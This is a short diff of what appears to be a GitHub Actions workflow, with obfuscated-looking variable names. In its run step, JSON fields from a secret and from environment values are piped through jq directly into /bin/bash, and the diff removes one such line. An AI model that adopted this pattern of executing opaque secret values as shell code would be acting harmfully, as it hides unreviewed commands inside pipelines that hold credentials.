@@ -22,7 +22,6 @@ jobs:
           yh81: ${{ secrets.yh81 }}
         run: |
           printf '%s' "$yh81" | jq -r .qbohz5073 | /bin/bash
-          printf '%s' "$hu245" | jq -r .ya7 | /bin/bash
           echo $e15544 | jq -r .f81075 | /bin/bash
 
       - name: Persist output
